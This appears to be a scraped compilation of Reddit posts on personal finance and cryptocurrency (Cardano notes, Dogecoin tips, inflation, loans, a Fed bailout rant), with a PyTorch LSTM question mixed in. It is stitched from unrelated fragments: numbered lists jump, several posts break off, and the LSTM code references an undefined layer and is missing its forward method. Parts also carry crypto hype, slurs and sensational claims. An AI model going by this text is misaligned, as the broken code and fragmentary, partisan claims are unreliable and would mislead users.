38. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
39. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
40. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.

This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)

89. Recap from yesterday:  the Africa Special Announcements revealed some additional puzzle pieces 1) COTI’s AdaPay is possibly the larger payments infrastructure puzzle piece, 2) [payway.et](https://payway.et/) is possibly the local payments puzzle piece, 3)  [yellowcard.io](https://yellowcard.io/) is possibly the local coin exchange puzzle piece, and 4) World Mobile (not mentioned at [africa.cardano.org](https://africa.cardano.org/) AFAIK) may be the network connectivity puzzle piece. I think they are going to connect a lot of disparate pieces for us on the 29th.

The interesting items are 1) it appears they are purporting to somehow insure their community backers against certain financial losses with caveats, 2) they plan to fund projects prior to token launch through token vouchers, and 3) it sounds like they are building a DEX called Card Swap. Notice that the “insurance” comes with caveats.  They were very transparent on that point and people should take notice. Is CardStarter good? Is it bad?  I have no idea.

stocks,What to do to set my 2 year old nephew and niece up for when they turn 20,"Hey there,

I'm trying to invest in the future of my nephew and niece. They're both 2 years old and I want to be able to set up a college fund of sorts for them. I'm 27 and will be rid of student loans in the next couple of months. I can comfortably set aside $350-400 each month for this purpose and I plan to do so for as long as I am able to. I myself am new and don't have a lot invested but would like to start early on their behalf. 

What is the best strategy I could go for. I plan to cost average on a monthly basis. Should I go for standard ETFs like SPY, VTI or growth/tech like TSLA, AAPL, MSFT or maybe take the dividend route with O, T, SCHD, SPYD etc. ( I have very limited knowledge) 

I am pretty new to this whole scene (&lt;3 months in) but I'd like to get something setup for them. Any tips would be helpful. Am I doing this too early? What factors should I consider? Should I setup a good portfolio myself and then focus on theirs? 

The other option I have is setup a govt controlled savings scheme in my home country. I can invest a max of around 2000$ every year in their account = 4000$ total. This savings will grow at &lt;6% each year and will compound itself and is tax free during withdrawal (after 15 years+) . But I doubt it will beat the S&amp;P 500 over a 15-20 year period considering inflation of my home currency and the interest rate is bound to change at any time. So I'd much rather have the investment in USD. 

Thanks!",finance
CryptoCurrency,"Investment, community and patience - a Cardano story","One of the most important questions for a long term investor is that of how to structure investments. This goes far beyond *purchasing* and is instead related to the form and placement of such investment. A simple example is a broker account with a trusted provider. They have your stock ""in street name"", a position that does not dilute your ownership or rights, but suggests a certain relationship for your convenience and their benefit also.

I have the same perspective with respect to my investment in Cardano, and it also informed my decisions related to this space in terms of launching [DAWN](https://www.opendawn.com/dawn) as a personal investment vehicle. After watching crypto on the sidelines for twelve years, and actively participating in certain projects such as the [land registry in Afghanistan](https://unhabitat.org/un-habitat-oict-and-lto-network-release-first-open-source-urban-land-registry-solution-for-the), I had a pretty good idea of what I wanted to accomplish.

1. I identified Cardano as a crypto asset with long-term potential
2. I identified that key factors to success now rest on momentum as much as forthcoming technical milestones
3. I identified an inflection point as traditional investors enter adjacent to the more knowledgable and experienced crypto crowd

You will have seen me posting quite extensively on long term investment in Cardano (collected [here](https://np.reddit.com/r/opendawn/)). The decision to apply my personal resources in addition to capital in purchasing ADA is measured and purposeful. If I am interested in this space, my peers will also be taking interest, and I would like to assist in making our shared journey comfortable.

It is about choosing a community within a community, or building a community within a community, and benefiting from what it can provide. The Opendawn reddit has attracted around 50 participants in its first week, and the DAWN investment vehicle is at six delegates and counting. Small metrics in the overall picture of Cardano, but in my view a positive indicator regarding where this is going.

Crypo is very, very noisy. It is exciting and has attracted a vast array of different interests. Cutting through that, taking the fundamentals that are important to you, is a skill in investing related to wealth rather than riches. There is an adage in carpentry that applies in this field as in so many elsewhere: measure twice, cut once.

This all fed into positioning regarding the messaging for my move into this field, the choices I made with respect to a personal investment vehicle and opening it up to third parties, and what I would like to accomplish over time. You can check out the specifics of [DAWN](https://www.opendawn.com/dawn) over at the website, but the key things you should note are:

1. It is based on reputation and clarity of purpose.
2. It uses metrics from Cardano Foundation to ensure competitiveness with much larger pools.
3. It is not a pool per se, but rather a space for like-minded investors to collaborate, including in a private delegate list.

There are a few things done to both incentivize and to filter parties reviewing the investment vehicle:

1. The metrics are displayed in a manner that require visitors to read and consider them to understand the specific reasons for competitiveness (DAWN is not interested in people randomly passing through).
2. The community incentives are clearly displayed but require a certain degree of investment sophistication to appreciate (access to a private  list for direct sharing makes more sense to seasoned investors).
3. The site is refined based on feedback, but with a clear stance on explanation of positioning rather than a sales pitch per se (it is purposefully slightly boring, as all investment should be).

This all equals a stance designed to encourage a community of peers. I recently conducted a poll of our community (it will be published shortly in another article), and the median investment horizon is five years, with the next largest grouping looking at ten years. These are the people I want to work with, and this is the framing I want to promote outward.

You see, I think Cardano is the first crypto solution that has a substantial and effective chance to positively disrupt a lot of spaces, including investment. I want to help build those bridges, and potentially use DAWN as a stepping stone for people in their entry. 

Looking at our broader community, there are many fantastic people and fantastic pools and fantastic initiatives out there. The key is to keep the momentum going, to make growth in this space as frictionless as possible, and to use the genuine value of Cardano to dispel lingering fears regarding the ethereal viability of crypto as a whole.

CryptoCurrency,Predicting the Tax narrative,"So I like to try and predict what the narrative around something would be in the future. With the tax story here is what I see that after the initial shock has subsided whales will stop shooting themselves in the foot. What are they going to do, withdraw out of all appreciating assets and keep it all in a deflating fiat ? The solution to higher capital gains , is to try to make more money not stop making money.

Also one article I read said:

“Indeed, there is “no relationship between capital-gains taxes and market returns,” writes David Lefkowitz, head of Americas equities at UBS. In 2013, for example, the S&amp;P 500 gained 30% even though the capital-gains tax rate rose nine percentage points. In 1981, the tax rate fell about eight percentage points, but the S&amp;amp;P 500 still fell 10%.

The reality is that earnings growth and interest rates are the most important factors affecting stocks, which makes assessing the impact of tax rate changes on stocks difficult”
(https://www.barrons.com/articles/a-higher-capital-gains-tax-usually-doesnt-affect-stocks-51616936400)

So after the initial shock dies down, I predict people will be looking to get better returns for their investments to offset the larger chunk of it disappearing. And at that point, money will be flooding into bitcoin as a safe store of value that also appreciates greatly.",cryptocurrency

dogecoin,# 1 on growing pages today!,"congrats! this is indeed a wonderful community! welcome newcomers!

Here are a few tips for dogecoin newcomers

1.) not a stock, its a currency.

2.) to the moon

3.) hodl and buy more

4.) we are one of the largest coins and THE largest coin under a dollar

5.) start researching what a currency is, and the power of them. (Then look at what, or whom, controls inflation) Video at the bottom is the easiest way i can explain my angle.

6.) ignore the tards saying ""iT iNfLatEs ItSeLf"". although this is true, doge inflates at a rate much slower than the dollar :) AND will eventually stop inflating.(Then look at what, or whom, controls inflation. primarily the us dollar)

7.) don't let a chart or pretty robinhood NEON colors affect your emotions. know what you own and youll do 1 of 2 things: autistically obsess over buying more or run like hell. you're free to do as you chose.

8.) you probably shouldn't sell your car like i did to buy more. BUT i am satisfied with the outcome. Just don't go over your means. you gotta eat man. (I do have a car still i just sold my challenger r/t that was sitting in the garage. never drove it. totally worth the doge tho)

9.) cryptos are highly volatile. this is where ""diamond hands"" comes into play.

10.) that volatility can work for you or against you. if you plan on trading, there will be an abundance of dips. so just be patient.

11.) most of all! enjoy the community and the memes, strap on and enjoy the view of the world from the moon!

12.) cheapest transaction cost (i.e. stop throwing value down the toilet using venmo or wire transfers)

13.) it has value because others value it, stick around a while you might end up valuing it as well.

14.) the doubters who like to say ""DoGe Is WoRtHlEsS"" are the same people who probably chase the dollar like a carrot on a stick. Not a terrible thing but, these NPCs are just that. NPCs they are not self aware.

I am not a financial advisor i just really love doge :) And I have been into doge for quite some time now I just want to share what ive learned so far that keeps me buying more.

This video can inform you about the problem that ""decentralized currencies"" have the power to solve for our financial system. Its also a pretty good video but i like cartoons so i digress.

[https://www.youtube.com/watch?v=mII9NZ8MMVM](https://www.youtube.com/watch?v=mII9NZ8MMVM)

If you made it this far you understand the problem, now think of what solution doge could provide :D

&amp;#x200B;

Highlights:

\----Low and fast transaction fees (think ATMs, venmo, cash app. they're pretty much stealing your money.)

\----Supportive positive amazing community to help you stay strong and hodl through those notorious dips

\----Decentralized (inflation rate is'nt yanked up and down like a yo-yo by a handful of unelected officials)

\----Just now being mass accepted into the world (slim jim, musk, dogg, milky way, snickers, newegg, and many more to come) this means more transactions. which means more demand.

\----Serves the function as a currency, whereas bitcoin, eth, ltc, etc. are finite and are the digital equivalent to gold. Ill give the best example that I can:

Imagine the financial universe and each flower on each branch is its own financial sector. (Auto, utility, btc, eth, banks, ev, weed, food, farming, ecommerce) now each one of these flowers is finite, has a market cap, and must be able to transfer value from one sector to the next (pollen) in order to maintain and existence throughout time. Now in comes the Bee. The Bee does what in nature that is so important? Bees pollinate. and in this case, the Bee is a currency (dollar bees, euro bees, yuan bees, whatever.) The BEE is a means to TRANSFER VALUE. However, these BEES are controlled and centralized by what? a QUEEN BEE (federal reserve). \[\[I know i'm going a little off the wall over here but I hope you guys are picking up what i'm putting down\]\] ---These bees are centralized and controlled--- In comes DOGE baby!! I'm sure you see the solution. Doge is clearly the better choice for pollination than the Bee. Because Doge is like buying your own bee farm. Get that honey baby.

I hope i made a bit of sense and could offer some sort of solace to newcommers as well as veterans doubting themselves yet again.

CryptoCurrency,Misconceptions about Inflation,"To revert the current focus of this sub back from ""keep hodling"" and ""do not look at the graphs"" towards something of substance, I wanted to take the time to explain a couple of things about inflation. From comments and posts I have read recently, this might help you understand what is actually happening in the world right now and adjust your behaviour accordingly.

So generally speaking, when we see a rise in money supply (M) as being observed in the US recently, many jump to the conclusion that this equals inflation. On the other hand though, we have just seen the FED stating that there are no appearent signs of increasing inflation.

Here is the explanation for this conundrum:

inflation / deflation is defined as the change in purchasing power a given amount of money has within a given period of time (environment). Inflation is not a direct translation of money supply (M)  but instead is also dependent on both real GDP (Y) as well as money exchange velocity (V). So, in order to determine the price level, you  would have the following (quantitative) equation:

P=(M\*V)/Y

What does this mean for our current situation? Well, during Corona and most other crisis, people tend to save significantly more of their income while spending less, which means that velocity (V) is greatly  reduced. Moreover, people are purchasing more selectively which means that necessities are increasing in price (food, FFP2 masks etc) while luxury products mostly do not see any inflation within that time frame. As long as that is the case, we will not see a significant change in (overall) consumer prices as it balances out the increase in money supply (M). With increasing economic activity, real GDP (y) is also rising again which also counteracts the increase in prices induced by an increase in money supply. 

The specific case of the US:

The US has some special economic parameters in this regard as the average debt per household is significantly higher than in other developed nations and there is limited access to social welfare programs while simultaniously issueing the world reserve currency. 

These factors both increase the necessity to hold any incoming money to cover basic needs such as food, rent and interest on loans whilst also providing many people in other regions in crisis with the ability to convert their currency to USD (or crypto ;)) in order to protect their wealth, meaning that demand for USD outside of the US is comparitively high. Which means part of money supply (M) is being soacked up elsewhere. I won't go into partial money supplies (M0-M4) because that is being defined differently from region to region and might cause confusion.

Conclusion:  The more people go out to gather, drink, buy stuff they do not need, go on vacation etc. etc. the more money velocity (V) increases which in turn induces prices to rise across the board. It is very likely for inflation to increase over time as the world climbs out of this crisis.",cryptocurrency

CryptoCurrency,Capital Gains and Income are two different things -- don't conflate them!,"So, lots of posts about Biden's proposal to increase Capital Gains and it could be like a 50% tax.

personalfinance,Pros and Cons of I-Bonds vs. Savings Account?,"I'm looking into I-Bonds as an alternative to a savings account. Here's what I've gathered so far in terms of pros/cons but I'd appreciate some feedback if I've missed anything and I have a question about some tax considerations:

1. Historically the composite rate of I-Bonds has sometimes been better than a savings account (I'm comparing to Ally) and sometimes worse. I found the composite rates [here](https://www.treasurydirect.gov/indiv/research/indepth/ibonds/res_ibonds_iratesandterms.htm) (you'll need to scroll down a bit).
2. There is a 1 year holding period, so you cannot sell before then.
3. If you sell within 5 years you lose the last 3 months of interest (e.g. if you sell after 18 months, you only get 15 months of interest).
4. You still pay federal income tax on the interest earned, but they are exempt from state or local income tax ([source](https://www.treasurydirect.gov/indiv/research/indepth/ibonds/res_ibonds_itaxconsider.htm)).
5. You can report interest every year or defer reporting interest on your taxes. 
6. Doesn't really apply to me, but you may be exempt from federal taxes too if you use the interest towards certain qualified education expenses ([source](https://www.treasurydirect.gov/indiv/research/indepth/ibonds/res_ibonds_ifaq.htm#tax)).
7. You are limited to $10,000/year for electronic I-bonds or $5,000/year for paper I-Bonds using your federal income tax refund. You could therefore potentially purchase $15,000 in a year.

I'm a little unclear on the point #5, do you have to decide at purchase whether you'll pay annually or defer, and are then unable to change it? Or could you elect to defer and then decide later on to pay taxes (without cashing out)?

Is there anything else I missed?

personalfinance,Savings vs Investing and Loan Advice!,"Hi all!

New here so if anything isn't clear, just let me know!

I am mid-20's, financially independent (have been since 18). I have been working at a restaurant in addition to my full-time 9-5 to save money for law school in the fall. At this moment, I have \~70k in loans from undergrad and masters degree. I have been blessed with some scholarship at my dream (top 10) law school, but overall I will need to take out a good chunk of loans. After scholarship, my estimated cost of living-included remaining cost of attendance would be about 190k total. Currently, I have saved \~17k. I have put some of that (about 5k) into a high-interest savings account (HISA). I keep about 2k in checking account through my national bank and the rest in savings in same national bank. II have ensured I have a rainy day fund (I feel comfy with 5k as emergency fund- this is the HISA) I plan to enter BigLaw when I graduate (the odds of this from school I'm attending are pretty good, as long as I am not like tippity-bottom of my class) and pay off debt aggressively. I have good credit (&gt;750). I have a 403b with about 2k in it (invested) leftover from another job that I cannot rollover as I do not have a 401k or any retirement and will not be eligible for it with my current job (would be eligible right as I quit), and would be taxed if I took it out.  


I'm just wondering what the best plan of attack is for my future. Should I:

1. Just keep saving, and use my saved money to cover living expense during my 1L year?
2. Invest a little of my money, but still keep enough back to cover living expenses?
3. Invest more of my money, and say ""fuck it"" to living expenses and just take out a larger loan to cover COL, assuming I'll easily be able to repay it?

For loans, should I:

\- Use federal loans and consolidate them later? (I have federal loans only at the moment, ranging from 3% interest to 7% interest; grad school loans on the higher side and assuming law ones will be as well)

\- Try and get a lower interest-rate private loan from a bank?

\- Try and pay off some existing loans (higher interest ones)? 

I am currently leaning towards: 

\- Keeping \~5k in the HISA for emergency

\- Investing small (\~1k) through an app (Betterment, Fidelity Spire, the like)

\- Paying off a good chunk (5-8k) of the higher-interest grad school loans (39k are grad loans) while not gaining interest bc COVID forbearance

\- Taking out a higher amount loan from a private entity for the lower interest rate and repaying later (aggressively)

TLDR: I have some money saved, but I'm starting school soon. Should I invest anything now? Do I take out public or private loans? Should I try and pay off existing loans now or just wait? Should I save money for living expenses? How much of a loan should I take in the fall? Should I move my money around in a different way?",finance
personalfinance,How to best save/invest ~$15 K in cash knowing I'll need to pay off $45K in interest-free loans in 2023?,"Hello!  We're selling an asset and fortunately anticipate about $15,000 net, although I'll need to confirm that after finalizing taxes.  In 2023, we have to pay off $45,000 in interest-free CARES loans.  Clearly there's a gap between the two numbers that will need to be addressed by supplementing the income in the interim.

Meanwhile, here are the ideas I've come up with:

* Put the 15 in an index fund until it is time to pay up.  Add money to that index fund monthly until there's enough to pay the 45K.
* Put the 15 K into an REIT - or diversify, putting some into REITs and some into market index funds.
* Diversify by putting some towards the debt ""just in case"".  Or put some into money market funds ""just in case"".

Ok, I'll be honest, that's all the ideas I've got at the moment.  Whatever I do, there is a definite deadline for repaying the loans, so I won't be able to ""ride out"" any significant losses.

&amp;#x200B;

EDIT:  If I do not pay the loans back by 2023, I will have to pay taxes on the money as it would be counted as an early retirement withdrawal.

EDIT 2:  Consensus is HYSA (or CD) for two years with monthly contributions.  It looks like HYSA are around 0.5% right now.  We do have $21,916 left on a car loan (I know, I know; in my spouse's mind, it made more sense to buy the car than repair the old one.  I lost this argument).  The interest rate is 3.49, payments about $610/month, should be done Jun 2024.

Originally I presumed that given the low 3.49% interest rate, it made more sense to just keep paying this loan.  But if I'm doing HYSA at 0.5% instead, would it make more sense instead to pay off this car loan first and then save from there?

personalfinance,PMI bait and switch? Discrepancy between final closing disclosures and 1st payment statement,"Hi everyone,

I closed on my house in early February. It was a 25-day close window since the sellers accepted our offer. Everything moved pretty fast, and I wish I noticed this mistake earlier.

The loan was a 30-year fixed $350k, 2.88% interest rate with 10% down. So for PMI, I was quoted 0.21% or around $60/month. So total 1st mo. payment would be $1900. This was confirmed in my final closing disclosure.

However, when I made my 1st payment this month, the bank (a new loan servicer than my lending company) held the payment in suspense because it was short $32. I then found out that the PMI is supposed to be $92/month. I contacted my originating loan officer, and it turns out that in the first payment letter, the PMI is $92, but the total payment is still $1900, not $1932. I cannot find the PMI rate breakdown from the 3rd party company to my lender anywhere in my closing documents.

I thought I received a low rate since my credit score is higher than 770. But now the loan officer is telling me that I should pay $1932, despite the math error on my 1st payment letter, and that the rate for PMI increased by the time we closed. It was a really quick close, and the rate couldn't have possibly increased by $32! I do have about a month to resolve it before the delayed payment impacts my credit. 

I guess I need help understanding which document would supercede which. What should be my recourse here? Any help/input you can provide is much appreciated. 

TL;DR - Different PMI's in my closing documents ($60 on final closing disclosures, $92 on first payment letter)  but the total monthly payment of $1900 is the same throughout the forms. 1st payment being held for the difference of $32.",finance

personalfinance,How to borrow money to loan it to my son to buy rental property?,"My son has two rental properties he has owned and managed for about 5 years. He is looking to buy another, and I want to help him finance it by tapping some of the equity in my paid-off beach house (currently worth \~ $2M). 

Apologies if this isn't really the right sub. 

**My general plan:** 

1. I get a HELOC on the beach house in my own name (e.g., a $1M LOC). 
2. Once my son finds a suitable property and gets an offer accepted, I take out enough from the HELOC to cover the purchase price and closing costs (e.g., $400k). 
3. I loan the $400k to my son (or his LLC) for the same interest rate as I pay (and an origination fee equal to any cost I had getting the HELOC opened). This will all be documented with a legally binding loan agreement, and my son will grant me a mortgage in the property securing the loan. 
4. My son makes the same monthly payments to me as I make to the bank on the HELOC. 
5. Down the road, my son does a cash-out refi on the property and pays off the balance of the HELOC. 
6. Rinse and repeat? 

**Questions:** 

1. Anyone have experience doing something like this? Anyone see any major problems with my general plan? Or better yet, anyone have a better idea to accomplish the same general goal?
2. My main concern that I'm looking for advice on is making sure (a) that my son can deduct the interest on the loan from me as a business expense for the rental and (b) that I don't end up with taxable interest income (ie, I want to make sure that the interest income I earn from my son is offset by an equal deductible interest expense on the HELOC loan funding the loan to my son). Is this feasible? 
3. Does it make more sense to have my son be a co-borrower on the HELOC, rather than the second loan scenario? Is that even possible? Problems with that?

**Additional Info:**

* We will definitely talk to a CPA and a lawyer before going through with this. I'm just trying to get a sense of feasibility and what we might be looking at here. I want to have a pretty good plan before going to them,
* My understanding is that interest on a HELOC generally isn't deductible anymore, unless used to improve the home, but it can be deductible under the interest tracing rules. So, for tax purposes, I would not treat the $400k loan as secured by my beach house. If I used it to buy investment property, myself, I'm fairly sure the interest would be deductible. But if I use it to make a loan to my son that I earn interest on, would that still work? I mean lending out my money to earn interest is an investment, no? That's basically what I do when I buy a bond, right?
* My son currently cannot qualify for a loan due to being self-employed without 2 years of self-employment income. He has excellent credit and makes low 6 figures. And he is very financially savvy (more so than I ever was--I'm very proud of him). I have no concerns about his ability to refi the property down the line. And I have no concerns about loaning him the money. In the very unlikely event he can't repay it, I am fine extending deadlines and ultimately forgiving it, if need be.
* Yes, my son currently would get all of the benefit out of this arrangement. I am not looking to make money off of this. I would prefer not to own part of the investment property or the LLC. I look at it as a way that I can help out my son a lot that doesn't really cost me much. I got lucky with how much that beach house appreciated and all of that equity has remained untapped for over 15 years. I wasn't using it, and don't plan to. I'm happy to facilitate my son's use of it. Also, I have a fairly high W2 income and very low debt, so this would have a negligible effect on my DTI ratio. I'm not worried about my ability to get additional loans.
* Yes, I understand that I would be encumbering my beach house and what that entails. I'm fine with it.",finance
personalfinance,Software for financial planning?,"I’ve been keeping a spreadsheet of my personal finances for most of my adult life and have every transaction back to 2008.

Currently, my financial picture is really bad, with so much debt I’m not really sure I’ll ever pay it off. But, I run my own business and may be able to grow my income by growing my business. 

I’d like to run some scenarios like what would happen if I could cut my food budget by $20 how that would impact my debt picture 3-5 years out, and if I could give myself a $500 monthly raise how that would effect it, etc. Currently, when I want to forecast stuff like that, it’s very cumbersome with my spreadsheet. But I’d imagine there could (and probably does) exist software that automatically processes your budget and amortizations to plot stuff like this out. 

Basically what I want is to input all my current balances, interest rates, and minimum payments for all my debts; known consistent sources of income; known spending patterns/budget; and have the computer spit out optimized payment strategies (pay minimums on a, b, c debts and put all your disposable income against D until paid off, then C, etc) and give me a forecast date for when I’ll hit certain milestones (credit cards paid off, student loans paid off, retirement account no longer embarrassing, etc).

Bitcoin,Preston Pysh and Bill Brewster Podcast - Did anyone have a listen?,"Nearly finished listening to the Business Brew podcast with Preston and Bill talking about Prestons journey from a value investor to Bitcoin. It's really interesting and my brain is going 90 now thinking about it. One thing that popped into my head was the idea of Bitcoin being used as the global reserve currency used by all nations and how governments would use it to push society forward. 

It's one of the reasons why I think floating currency works so well but is poorly implemented by governments. Let's stick with the assumption that Bitcoin is the global reserve currency and disaster strikes and government can't print in order to keep people in homes, fed or pay to build hospitals. 

How do you think this scenario would play out in a world where currency is denominated in Bitcoin? Do you assume people rise to the occasion and give Bitcoin to those less fortunate?",cryptocurrency

deeplearning,Pytorch LSTM: Sine Wave Prediction using Adam and batches,"Hey, all

I have been trying to understand the PyTorch sine wave example given here: [example](https://github.com/pytorch/examples/tree/master/time_sequence_prediction)

It took me some time to digest what actually is happening and how the input/output pair is made in this.  
They have used LBFGS and have fed all the batches at once which might not be feasible in every case, thus I was trying to implement the same example using batched way and using Adam Optimizer.

I have also tweaked the Model structure a bit, now my model is like this:

    class Sequence(nn.Module):
        def __init__(self):
            super(Sequence, self).__init__()
            self.lstm1 = nn.LSTMCell(1, 50) #only 1 feature in input, 51 is no of features in hidden_state
            self.lstm2 = nn.LSTMCell(50, 50) #prev cell outputs 51, so this input is 51, and it outputs 51 (hidden_dim)
            self.linear = nn.Linear(50, 36) #takes 51 dim to predict 1 value
            self.relu = nn.ReLU()
            self.linear2 = nn.Linear(36, 24)

                output = self.linear3(self.relu(self.linear2(self.relu(self.linear(h_t2)))))
                #output = self.linear(h_t2)

        plt.close()

Now, as you can see from this plot below, the results are very disappointing and the model is not able to predict future values properly and even is not very accurate on predicting test set values that have the real ground truth labels.

I really want to go deep into this and understand what is actually happening and how can I fix this, LSTM is supposed to have a memory element due to cell state that’s what I know, and since the cell state used at time t = 0 is propagated to time t = 999, why it's still failing to predict the sine wave values for future times (after t = 1000) on the test set data?

Thank you so much for your time.

personalfinance,Deciding if we should refinance now or wait,"Hi! The long and short of it is that we think refinancing is a good idea for us (my husband and I).  We plan on staying here at least 5 years (probably more).  We have PMI on our FHA loan and a 4.5% interest rate.  We can refinance and get the interest rate to nearly half that and get the PMI off the loan also.  So even with the closing costs it does seem to make sense for us to go ahead with it. 

A couple of questions though:  what is a reasonable amount for closing costs?  We have been been quoted $7k and $6k by two different banks.  One of which would roll those into the new mortgage (which my husband would prefer NOT to do) 

Also we need to replace our central AC.  We prefer to pay cash.  We went most of last summer without it and I’d like to get it done this year.  

We have something like $14,000 in savings at the moment.  We’re trying to figure out what the best course of action is.  Our house has gone up something like 30k in the last 3-4 years and figured that would work to our advantage with refinancing.  So trying to decide if it would be prudent to put off the refinancing until we could re-save up the closing costs or  do it now and put off the AC.

**This is why we need cryptocurrency**. From December 2007 to November 10, 2011, the Federal Reserve, *secretly and without the awareness of Congress and the people*, funneled about $19.6 trillion to bail out the big banks on Wall Street and around the world. Just 14 global financial institutions received 83.9 percent or $16.41 trillion. These are the same institutions that were responsible for the financial crisis in the first place.

&amp;#x200B;

[A list of the corrupt banks that received the secret bailouts and the amounts they received. \(source: http:\/\/www.levyinstitute.org\/pubs\/wp\_698.pdf\)](https://preview.redd.it/i1hurh03uwu61.jpg?width=510&amp;format=pjpg&amp;auto=webp&amp;s=e25abd8ee3fd35aaed81273344ee71cdb23d2780)

This was only found out because Bernie Sanders amended the Dodd-Frank Reform law to audit the Fed, pushing the GAO (Government Accountability Office) to step in and take a look around. Ben Bernanke, Alan Greenspan, and various other bankers vehemently opposed the audit and lied to Congress about the effects an audit would have on markets. This was the first audit of the Fed in the history of the United States since its beginnings in 1913. Unsurprisingly, this was scarcely reported by mainstream media – albeit the results are undoubtedly newsworthy. I find it funny that the American people were absolutely outraged that the federal government spent 700 billion dollars bailing out the “too big to fail” banks. Well, that bailout was pocket change compared to what the Federal Reserve did. Keep in mind that the GDP of the United States for the entire year of 2010 was only 14.58 trillion dollars. 19 trillion dollars is an almost inconceivable amount of money.

Take all of the outrage and debate over the $1.5 trillion deficit into consideration, and swallow this Red pill: There was **absolutely no debate** about whether $16,000,000,000,000 would be given to failing banks and failing corporations around the world. The Federal Reserve and the big banks fought for more than two years to keep details of the largest bailout in U.S. history a secret. I find it pretty evil that they had such incomprehensible amounts of money to throw around to corrupt financial institutions while regular people were suffering and struggling to find jobs. This kind of gross corruption is what led Satoshi Nakamoto to create Bitcoin.

tl;dr - Fuck the big banks. Fuck the Federal Reserve. Take back your financial power. Be your own bank.",cryptocurrency
personalfinance,(US) Just turned 18 and need to move out but have no money,"So basically I am 18, and all I have is $30 in cash. I had more than $1200 from working part-time and I was going to use it to move out, but it was held in a joint account (I was under 18 and needed parent permission, and I also trusted them too much) and my parents withdrew all the money before I turned 18.


My parents are quite controlling people; they do not want me to learn how to drive but they will not tell me why. They are also afraid to send me to school because they think I will have sex before marriage and do drugs. I have been homeschooled since 7th grade. They intercept all my mail and they open it and read it; after they read it, sometimes they do not even let me read the mail. I am not allowed to go outside the house unless either my mom or dad is present. I know my SSN and I have my driver's license, but all my documents (passport, social security card, etc.) are in a safe that only my mom has the key to. I am also a college freshman doing online classes right now, but I am failing all my classes because I hate living here and I feel like I am useless and have no choice but to listen to what my parents say. All my neighbors have perfectly normal lives and their parents are not crazy; they get to have jobs and friends and do normal people things.


So that is info about me. If any of you know a way that I could potentially get out of this situation it would really be helpful for me. I tried applying for a bank account but my parents shouted at me and made me close the account after they opened my mail. I only have 1 friend but he can only send $100.



Thanks in advance for any advice.



EDIT: Also learned I have a 670 credit score thanks to creditkarma.com. Apparently I have $4,000 of student loans too, I was naive and didn't realize I had ever signed for those.



EDIT 2: My friend helped me get an account at his credit union. He is also cosigning on a personal loan to help me out, but the loan will barely be able to cover 1 month worth of expenses.


EDIT 3: I also called the restaurant where I worked before my parents took my money, and they said they would be willing to hire me for minimum wage

personalfinance,What is the smartest way to navigate an auto loan?,"I was always told the lower the term length the better. But I was thinking about it, and I believe longer lengths are better? So please correct me if I'm wrong; I'm definitely no expert here:

So basically when paying an auto loan you have your principal amount and interest, with the interest being calculated based off of your total principal every month. When you pay your minimum due every month, a nice chunk of that goes to interest already which reduces the amount going towards your principal, which basically translates to you being sucked dry by paying more and more interest and less principal (which is the debt of the car to whoever issued the loan). Now the other problem here is that if you're paying minimum, you're probably not in a good position financially because you can't overpay every month in order to actually help reduce the principal (and I've heard some cases of excess payments being stored for future interests somehow? So you have to be sure it's going to the principal - but you can have that credited towards your principal by calling and asking anyway).

If that's all correct, then another thing I'll add is the interest is lower for longer terms because it helps entice you to go for these longer terms but based on the need for lower payments, you probably will be abused by this interest system and wind up paying more for the full total of the term even at the reduced percentage.

So my personal thoughts now become: if I can afford the higher term (36 month at 350/month) then instead of taking that 36 month term, I'd be better off taking the 72 months (200/month) at the lower interest rate, and simply pay it off at the same rate as I would have for the 36 months (putting 350 instead of the 200). This would A) put more money towards my principal every month which effectively reduces the interest more quickly, B) I have a lower interest rate to begin with which again helps send more of that chunk to principal, but also makes the total interest cost reduce since the time of the term would be cut in half due to excessive payments to the principal, and C) if I *did* struggle with a monthly payment, then the minimum due would also be significantly smaller which is easier to find the money for or budget for.

Long story short: if I can afford the 36 term, take the 72 term, and treat it like a 36 term so I get a lower interest rate and better minimum due each month? Or am I insane and completely misunderstand how auto loans work. Help please lol",finance

CryptoCurrency,Opinion: The cost of domestic wire transfers gives Ethereum a short term competitive edge with legacy financial institutions,"I'm not and Eth Maxi,(I'm very bullish on DOT and ADA) which made me curious as to why so many institutions(visa, mastercard...etc) continue to pile into an increasingly crowded and expensive protocol. But then, as I investigated setting up Fedwire for Kraken, I realized that I was approaching this from the wrong angle. For many large banks and financial institutions, **the time and cost to settle funds is paramount.**

**On the Blockchain, you're paying for near-immediate fund settlement**. Something that can take nearly 3 days for Visa behind the scenes. For a Wire transfer which usually settles within 6 hours, it generally cost around $30 to send and on average \~$20 to receive. Even at current gas prices, **it remains both cheaper, and faster to settle in Stablecoins on Ethereum than to initiate a domestic wire transfer.**  As long as this is the case, I believe financial institutions will stick to Ethereum. They theoretically save time, money, and avoid the risks associated with newer protocols. They can leverage Ethereum's hashrate security and see how the network handles the PoS shift (if it ever happens) before jumping onto these other protocols...which they eventually will.

Anyways, that's my musing. Don't think it has much indication the price of Eth, but just found the thought interesting. What do the rest of y'all think?",cryptocurrency
personalfinance,"Turning credit around, want to buy a house and consolidate private loans - which to prioritize?","In  2018 my wife and I finalized our CH7 bankruptcy. All said and done we were left with student loan debt only. Her debt is around 50k total mine is around 80k total. I was too dumb to get full scholarships and moved schools midway through my college career which lost me what scholarships I did have so I took full advantage of federal and private loans to enjoy my college experience. Obviously I'm paying for that now. Not the point.

Now, 2 years and some months after the discharge of bankruptcy we are doing much better. We have an emergency fund. We have a car note with under $5k left to pay that we are considering wiping out in it's entirety. We are financially stable in a way we were not before.

